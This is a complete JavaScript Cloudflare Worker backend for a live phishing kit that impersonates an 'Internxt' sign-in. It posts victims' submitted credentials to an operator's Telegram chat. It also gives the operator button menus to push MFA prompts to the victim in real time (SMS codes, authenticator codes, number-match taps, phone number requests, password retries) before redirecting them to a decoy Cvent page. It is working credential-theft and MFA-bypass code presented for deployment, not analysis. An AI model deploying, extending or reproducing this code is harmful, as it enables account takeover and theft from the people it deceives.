/**
 * Cloudflare Pages & Workers Universal Gateway
 * Intercepts /next.php/*, /check.php, and /redirect.php, serving the rest as static assets.
 */

const FINAL_CVENT_URL = "https://www.cvent.com/events/2018-facial-rejuvenation/event-summary-66dad18444ca4ff1b1379df029fd67f3.aspx/";

// In-worker memory session store
const cfSessions = new Map();

function buildMainActionsKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '🔢 Number-Tap (1-99)', callback_data: `act:${sessionId}:num_menu` },
        { text: '📱 Tap-Yes', callback_data: `act:${sessionId}:tap_yes` }
      ],
      [
        { text: '💬 SMS Code', callback_data: `act:${sessionId}:sms_code` },
        { text: '🔐 Auth Code', callback_data: `act:${sessionId}:auth_code` }
      ],
      [
        { text: '📞 Ask Phone', callback_data: `act:${sessionId}:ask_phone` },
        { text: '🔁 Wrong Password', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '✅ Approve (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }
      ]
    ]
  };
}

function buildRangePickerKeyboard(sessionId) {
  return {
    inline_keyboard: [
      [
        { text: '1 - 20', callback_data: `rng:${sessionId}:1-20` },
        { text: '21 - 40', callback_data: `rng:${sessionId}:21-40` }
      ],
      [
        { text: '41 - 60', callback_data: `rng:${sessionId}:41-60` },
        { text: '61 - 80', callback_data: `rng:${sessionId}:61-80` }
      ],
      [
        { text: '81 - 99', callback_data: `rng:${sessionId}:81-99` },
        { text: '📋 Show All 1-99', callback_data: `rng:${sessionId}:all` }
      ],
      [
        { text: '⬅️ Back to Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

function buildNumberGridKeyboard(sessionId, start, end) {
  const rows = [];
  let currentRow = [];
  for (let i = start; i <= end; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 5) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Pick Another Range', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildAllNumbersGridKeyboard(sessionId) {
  const rows = [];
  let currentRow = [];
  for (let i = 1; i <= 99; i++) {
    currentRow.push({ text: String(i), callback_data: `num:${sessionId}:${i}` });
    if (currentRow.length === 8) {
      rows.push(currentRow);
      currentRow = [];
    }
  }
  if (currentRow.length) rows.push(currentRow);
  rows.push([
    { text: '⬅️ Range View', callback_data: `act:${sessionId}:num_menu` },
    { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
  ]);
  return { inline_keyboard: rows };
}

function buildNumberActiveKeyboard(sessionId, number) {
  return {
    inline_keyboard: [
      [
        { text: `✅ User Tapped ${number} (Approve)`, callback_data: `act:${sessionId}:approve` },
        { text: '❌ Wrong Number', callback_data: `act:${sessionId}:wrong_num` }
      ],
      [
        { text: '🔢 Change Number', callback_data: `act:${sessionId}:num_menu` },
        { text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }
      ],
      [
        { text: '🏠 Main Actions', callback_data: `act:${sessionId}:back_main` }
      ]
    ]
  };
}

async function callTelegram(botToken, method, params = {}) {
  if (!botToken) return { ok: false, error: 'No bot token' };
  try {
    const res = await fetch(`https://api.telegram.org/bot${botToken}/${method}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params)
    });
    return await res.json();
  } catch (e) {
    return { ok: false, error: e.message };
  }
}

async function handleTelegramCallback(callbackQuery, botToken) {
  const data = callbackQuery.data || '';
  const cqId = callbackQuery.id;
  const msgId = callbackQuery.message?.message_id;
  const chatId = callbackQuery.message?.chat?.id;

  if (!data) return;

  if (data.startsWith('act:')) {
    const [, sessionId, action] = data.split(':');
    const session = cfSessions.get(sessionId);
    if (!session) {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
      return;
    }

    if (action === 'num_menu') {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔢 <b>Select Number Range (1-99)</b>\nSession: <code>${sessionId}</code>\nPick a range below:`,
        parse_mode: 'HTML',
        reply_markup: buildRangePickerKeyboard(sessionId)
      });
    } else if (action === 'back_main') {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Sign-In Attempt (Internxt)</b>\nEmail: <code>${session.email || 'User'}</code>\nSession: <code>${sessionId}</code>\n\nChoose verification action:`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'tap_yes') {
      session.redirect = 'Tap-Yes';
      session.status = 'pending';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Tap-Yes' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📱 <b>Tap-Yes Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: {
          inline_keyboard: [
            [{ text: '✅ Approved (Redirect to Cvent)', callback_data: `act:${sessionId}:approve` }],
            [{ text: '🔁 Request Password Again', callback_data: `act:${sessionId}:retry` }],
            [{ text: '🏠 Main Menu', callback_data: `act:${sessionId}:back_main` }]
          ]
        }
      });
    } else if (action === 'sms_code') {
      session.redirect = 'SMS CODE';
      session.status = 'pending';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: SMS Code' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `💬 <b>SMS Code Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'auth_code') {
      session.redirect = 'Authentication Code';
      session.status = 'pending';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Authenticator App Code' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔐 <b>Authenticator App Code Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'ask_phone') {
      session.redirect = 'Ask Phonnumber';
      session.status = 'pending';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Selected: Ask Phone' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `📞 <b>Phone Prompt Active</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'retry') {
      session.status = 'retry';
      session.message = 'retry';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Password Retry Sent' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🔁 <b>Password Retry Sent</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    } else if (action === 'approve') {
      session.status = 'saved';
      session.redirect = FINAL_CVENT_URL;
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Approved! Redirecting...' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `🎉 <b>VERIFICATION APPROVED</b>\nSession: <code>${sessionId}</code>\nUser redirected to Cvent event summary.`,
        parse_mode: 'HTML'
      });
    } else if (action === 'wrong_num') {
      session.status = 'wrong_number_pressed';
      cfSessions.set(sessionId, session);
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Marked as Wrong Number' });
      await callTelegram(botToken, 'editMessageText', {
        chat_id: chatId,
        message_id: msgId,
        text: `❌ <b>Wrong Number Tapped</b>\nSession: <code>${sessionId}</code>`,
        parse_mode: 'HTML',
        reply_markup: buildMainActionsKeyboard(sessionId)
      });
    }
  } else if (data.startsWith('rng:')) {
    const [, sessionId, range] = data.split(':');
    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId });
    let keyboard, text;
    if (range === 'all') {
      keyboard = buildAllNumbersGridKeyboard(sessionId);
      text = `🔢 <b>Tap any Number (1 - 99):</b>\nSession: <code>${sessionId}</code>`;
    } else {
      const [start, end] = range.split('-').map(Number);
      keyboard = buildNumberGridKeyboard(sessionId, start, end);
      text = `🔢 <b>Select Number (${start} - ${end}):</b>\nSession: <code>${sessionId}</code>`;
    }
    await callTelegram(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: text,
      parse_mode: 'HTML',
      reply_markup: keyboard
    });
  } else if (data.startsWith('num:')) {
    const [, sessionId, numStr] = data.split(':');
    const number = parseInt(numStr, 10);
    const session = cfSessions.get(sessionId);
    if (!session) {
      await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: 'Session expired.', show_alert: true });
      return;
    }
    session.numberTap = String(number);
    session.redirect = `Number-Tap:${number}`;
    session.status = 'pending';
    cfSessions.set(sessionId, session);

    await callTelegram(botToken, 'answerCallbackQuery', { callback_query_id: cqId, text: `Selected: ${number}` });
    await callTelegram(botToken, 'editMessageText', {
      chat_id: chatId,
      message_id: msgId,
      text: `✅ <b>Number-Tap [ ${number} ] Active!</b>\nSession: <code>${sessionId}</code>\nUser screen is now displaying number <b>${number}</b>.\n\nDid user confirm?`,
      parse_mode: 'HTML',
      reply_markup: buildNumberActiveKeyboard(sessionId, number)
    });
  }
}

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const pathname = url.pathname;
    const method = request.method;

    // Resolve credentials from environment or defaults
    const botToken = env?.TELEGRAM_BOT_TOKEN || '';
    const chatId = env?.TELEGRAM_CHAT_ID || '';

    // Route: Redirect.php
    if (pathname === '/redirect.php') {
      return Response.redirect(FINAL_CVENT_URL, 302);
    }

    // Route: Rejectnumber.php
    if (pathname === '/rejectnumber.php') {
      const rejectReq = new Request(new URL('/rejectnumber.html', request.url), request);
      return env.ASSETS ? env.ASSETS.fetch(rejectReq) : new Response('Rejected', { status: 200 });
    }

    // Route: Submit Result
    if (method === 'POST' && (pathname.includes('/submit-result') || pathname.endsWith('submit-result'))) {
      const data = await request.json().catch(() => ({}));
      if (!data.result) {
        return new Response(JSON.stringify({ error: 'Missing required field: result' }), {
          status: 400,
          headers: { 'Content-Type': 'application/json' }
        });
      }

      const sessionId = Math.random().toString(36).substring(2, 10);
      let email = '';
      const match = data.result.match(/Email\s*:\s*([^\r\n]+)/i);
      if (match) email = match[1].trim();

      const targetChatId = (data.telegramChatID && data.telegramChatID !== '---') ? data.telegramChatID : chatId;

      const session = {
        sessionId,
        email,
        status: 'pending',
        redirect: '',
        numberTap: '',
        message: 'Please wait...',
        licenseKey: data.licenseKey || '',
        telegramChatID: targetChatId,
        systemValue: data.systemValue || 'livepage_3month',
        rawResult: data.result,
        createdAt: Date.now(),
        updatedAt: Date.now()
      };
      cfSessions.set(sessionId, session);

      if (botToken && targetChatId) {
        const text = `🔔 <b>New Sign-In Submission (Internxt)</b>\n━━━━━━━━━━━━━━━━━━━━━\n📧 <b>Email:</b> <code>${email || 'Unknown'}</code>\n🆔 <b>Session:</b> <code>${sessionId}</code>\n<pre>${data.result.substring(0, 800)}</pre>\n━━━━━━━━━━━━━━━━━━━━━\nSelect next verification step:`;
        const keyboard = buildMainActionsKeyboard(sessionId);

        await callTelegram(botToken, 'sendMessage', {
          chat_id: targetChatId,
          text,
          parse_mode: 'HTML',
          reply_markup: keyboard
        });

        return new Response(JSON.stringify({
          sessionId,
          message: 'Verifying credentials...'
        }), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify({
        error: "Telegram bot credentials are not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID environment variables."
      }), {
        status: 400,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Route: Session Open
    if (method === 'POST' && pathname.includes('/session-open')) {
      const data = await request.json().catch(() => ({}));
      const targetChatId = (data.telegramChatID && data.telegramChatID !== '---') ? data.telegramChatID : chatId;

      if (botToken && targetChatId && data.message) {
        await callTelegram(botToken, 'sendMessage', {
          chat_id: targetChatId,
          text: `🌐 <b>Visitor Opened Portal</b>\n<pre>${data.message}</pre>`,
          parse_mode: 'HTML'
        });
      }
      return new Response(JSON.stringify({ status: 'ok' }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Route: Status Polling
    if (method === 'GET' && (pathname.includes('/status/') || url.searchParams.has('sessionId'))) {
      let sessionId = url.searchParams.get('sessionId');
      if (!sessionId) {
        const parts = pathname.split('/status/');
        sessionId = parts[1];
      }

      const session = cfSessions.get(sessionId);
      if (session) {
        const resp = {
          sessionId,
          status: session.status || 'pending',
          message: session.message || 'Please wait...'
        };
        if (session.redirect) resp.redirect = session.redirect;
        if (session.numberTap) resp.numberTap = session.numberTap;

        return new Response(JSON.stringify(resp), {
          status: 200,
          headers: { 'Content-Type': 'application/json' }
        });
      }

      return new Response(JSON.stringify({ error: 'Session not found or expired' }), {
        status: 404,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Route: check.php (for tap.html)
    if (pathname === '/check.php') {
      let email = '';
      if (method === 'POST') {
        const form = await request.formData().catch(() => null);
        if (form && form.has('em')) {
          email = form.get('em');
        } else {
          const bodyJson = await request.json().catch(() => ({}));
          email = bodyJson.em || '';
        }
      } else {
        email = url.searchParams.get('em') || '';
      }

      if (!email) return new Response('waiting', { status: 200 });

      let found = null;
      for (const s of cfSessions.values()) {
        if (s.email && s.email.toLowerCase().trim() === email.toLowerCase().trim()) {
          found = s;
          break;
        }
      }

      if (!found) return new Response('waiting', { status: 200 });

      const status = found.status || 'pending';
      if (status === 'saved' || status === 'approved') return new Response('saved', { status: 200 });
      if (status === 'wrong_number_pressed') return new Response('wrong_number_pressed', { status: 200 });
      return new Response('waiting', { status: 200 });
    }

    // Route: Telegram Webhook
    if (method === 'POST' && (pathname.includes('/telegram-webhook') || pathname.includes('/webhook'))) {
      const update = await request.json().catch(() => ({}));
      if (update.callback_query && botToken) {
        await handleTelegramCallback(update.callback_query, botToken);
      }
      return new Response(JSON.stringify({ ok: true }), {
        status: 200,
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // Pass through to static assets (HTML, CSS, JS, images)
    if (env.ASSETS) {
      return env.ASSETS.fetch(request);
    }
    return new Response('Not found', { status: 404 });
  }
};
